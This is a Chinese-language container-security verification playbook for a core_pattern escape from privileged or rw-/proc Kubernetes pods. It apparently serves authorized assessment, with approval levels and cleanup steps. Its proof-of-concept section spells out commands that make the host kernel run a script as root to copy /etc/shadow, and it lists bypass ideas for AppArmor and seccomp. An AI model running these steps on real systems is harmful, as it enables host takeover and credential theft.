---
source: manual
confidence: high
platforms: [k8s, docker]
required_tools: []
execution_contexts: [L0, L1, L2, L3]
max_verification_level: L3
destructive: true
mapped_attack_surfaces: [AS-1.3]
mapped_compliance_families: [危险挂载, procfs暴露]
---

# procfs-escape — procfs core_pattern 逃逸

容器内 `/proc` 以读写方式挂载，攻击者通过修改 `/proc/sys/kernel/core_pattern` 注入逃逸命令，触发 core dump 时在宿主机执行任意命令。

---

## 1. 前置条件

- 容器以特权模式运行，或 `/proc` 被以读写方式挂载
- `/proc/sys/kernel/core_pattern` 文件可写
- 容器有能力触发 core dump（无需特殊权限即可通过进程崩溃触发）

检查命令：
```bash
# [L0] 宿主机观察：确认 Pod 特权模式
kubectl get pod <pod-name> -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

# [L1] 容器内观察：确认 /proc 挂载为读写
kubectl exec -n <ns> <pod-name> -- cat /proc/mounts | grep " /proc "
# 期望输出: proc /proc proc rw,...（包含 rw）

# [L1] 容器内观察：确认 core_pattern 可写
kubectl exec -n <ns> <pod-name> -- test -w /proc/sys/kernel/core_pattern && echo "writable" || echo "not writable"
# 期望输出: writable
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认当前 core_pattern 值（攻击前基线）
cat /proc/sys/kernel/core_pattern
# 期望输出: |/usr/lib/systemd/systemd-coredump %P %u %g ... 或 core

# [L1] 容器内观察：确认容器内看到的 core_pattern
kubectl exec -n <ns> <pod-name> -- cat /proc/sys/kernel/core_pattern
# 期望输出: 同宿主机值（/proc 挂载映射到宿主机内核参数）

# [L1] 容器内观察：确认 /proc 挂载选项
kubectl exec -n <ns> <pod-name> -- cat /proc/mounts | grep " /proc "
# 期望输出: proc /proc proc rw,relatime 0 0（rw 确认可写）

# [L1] 容器内观察：确认 core_pattern 文件权限
kubectl exec -n <ns> <pod-name> -- ls -la /proc/sys/kernel/core_pattern
# 期望输出: -rw-r--r-- ... /proc/sys/kernel/core_pattern

# [L1] 容器内观察：确认可触发 core dump 的能力
kubectl exec -n <ns> <pod-name> -- bash -c 'ulimit -c'
# 期望输出: 0（unlimited 或非 0 表示可生成 core dump）
```

## 3. 攻击验证

```bash
# [L3] 条件验证（⚠️ 不可安全复现，会修改内核参数并在宿主机执行命令）
# 验证级别: L3-条件验证
# 不可安全复现原因: 修改 core_pattern 影响整个宿主机所有进程的 core dump 行为，且触发命令在宿主机执行

# 前置条件满足证明:
# ✅ kubectl get pod <pod-name> -o jsonpath='{.spec.securityContext.privileged}' = true
# ✅ kubectl exec <pod> -- cat /proc/mounts | grep " /proc " 包含 rw
# ✅ kubectl exec <pod> -- test -w /proc/sys/kernel/core_pattern = writable

# ⚠️ POC步骤（理论推导，实际执行会影响宿主机内核参数）：
#
# [L2] 步骤1: 创建逃逸脚本
# kubectl exec -n <ns> <pod-name> -- bash -c 'echo "#!/bin/bash" > /tmp/escape.sh'
# kubectl exec -n <ns> <pod-name> -- bash -c 'echo "cat /etc/shadow > /tmp/procfs_escape_proof" >> /tmp/escape.sh'
# kubectl exec -n <ns> <pod-name> -- chmod +x /tmp/escape.sh
#
# [L2] 步骤2: 修改 core_pattern 指向逃逸脚本（管道符前缀意味着以 root 执行管道后命令）
# kubectl exec -n <ns> <pod-name> -- bash -c 'echo "|/tmp/escape.sh" > /proc/sys/kernel/core_pattern'
#
# [L2] 步骤3: 触发 core dump
# kubectl exec -n <ns> <pod-name> -- bash -c 'ulimit -c unlimited && sleep 1000 & PID=$! && kill -11 $PID'
# 预期影响: 进程崩溃触发 core dump，内核以 root 身份执行 /tmp/escape.sh
#
# [L2] 步骤4: 验证逃逸结果
# cat /tmp/procfs_escape_proof
# 预期输出: root:$6$...:... (宿主机 /etc/shadow 内容)
#
# [L2] 清理:
# echo "core" > /proc/sys/kernel/core_pattern  # 恢复默认值
# kubectl exec -n <ns> <pod-name> -- rm /tmp/escape.sh
# rm -f /tmp/procfs_escape_proof
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录宿主机 core_pattern 原始值
cat /proc/sys/kernel/core_pattern
# 期望输出: |/usr/lib/systemd/systemd-coredump ... 或 core

# [L0] 攻击前环境快照：记录宿主机 /tmp 下无逃逸证明文件
ls -la /tmp/procfs_escape_proof 2>&1
# 期望输出: No such file or directory

# [L0] 攻击后环境对比：检查 core_pattern 是否被修改
cat /proc/sys/kernel/core_pattern
# 期望输出: |/tmp/escape.sh（被修改 → 证明攻击执行）

# [L0] 攻击后环境对比：检查逃逸证明文件
ls -la /tmp/procfs_escape_proof 2>&1
# 期望输出: -rw-r--r-- ... /tmp/procfs_escape_proof（文件存在 → 证明逃逸成功）

# [L2] 容器内读取宿主机文件证明逃逸成功
cat /tmp/procfs_escape_proof 2>/dev/null
# 期望输出: root:$6$...:... (宿主机 /etc/shadow 内容) → 证明逃逸成功

# 清理
echo "core" > /proc/sys/kernel/core_pattern
rm -f /tmp/procfs_escape_proof
```

差分结论：攻击前 `core_pattern` 为默认值且无逃逸证明文件，攻击后 `core_pattern` 被修改且宿主机 `/tmp` 出现包含 `/etc/shadow` 内容的文件，证明 core_pattern 在宿主机层面以 root 执行了逃逸命令。

## 5. 绕过策略

```bash
# [L1] 检查 AppArmor 是否限制 /proc/sys/kernel 写入
kubectl exec -n <ns> <pod-name> -- cat /proc/1/attr/current
# 若输出含 proc 限制策略 → AppArmor 可能阻断 core_pattern 写入

# [L1] 检查 Seccomp 是否阻止 open/write 系统调用
kubectl exec -n <ns> <pod-name> -- cat /proc/1/status | grep Seccomp
# 若 Seccomp: 2 (strict) → 可能阻断

# 绕过方式：
# - [L2] 若 /proc/sys/kernel/core_pattern 不可写但 /proc/sys 以 rw 挂载，检查其他可写内核参数
# - [L2] 若 core_pattern 被 AppArmor 限制，尝试通过 /proc/sysrq-trigger 触发其他内核机制
# - [L2] 若容器无 /proc/sys/kernel 写权限但有 CAP_SYS_ADMIN，尝试重新挂载 /proc 为 rw
```

## 6. 证伪条件

```bash
# [L1] /proc 以只读方式挂载
kubectl exec -n <ns> <pod-name> -- cat /proc/mounts | grep " /proc " | grep -c rw
# 输出: 0 → /proc 为只读，core_pattern 不可写 → 证伪

# [L1] core_pattern 不可写
kubectl exec -n <ns> <pod-name> -- test -w /proc/sys/kernel/core_pattern && echo "writable" || echo "not writable"
# 输出: not writable → 证伪

# [L1] core_pattern 文件不存在（极少见，内核配置缺省）
kubectl exec -n <ns> <pod-name> -- ls /proc/sys/kernel/core_pattern 2>&1
# 输出: No such file or directory → 证伪

# [L0] Pod 非特权且 /proc 未以 rw 挂载
kubectl exec -n <ns> <pod-name> -- cat /proc/mounts | grep " /proc " | grep -o 'ro\|rw'
# 输出: ro → 证伪
```

## 7. 审批级别

- **L3** 条件验证（理论推导 core_pattern 逃逸）→ **Level 5**（修改内核参数并在宿主机执行命令，必须人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：是（修改内核参数影响宿主机所有进程）
- 最高验证层级：L3

## 8. MITRE ATT&CK

- **Tactic**: Defense Evasion / Privilege Escalation
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者利用容器对 `/proc/sys/kernel/core_pattern` 的写权限，将 core dump 处理程序修改为恶意脚本，通过触发进程崩溃在宿主机上以 root 身份执行任意命令，实现容器逃逸。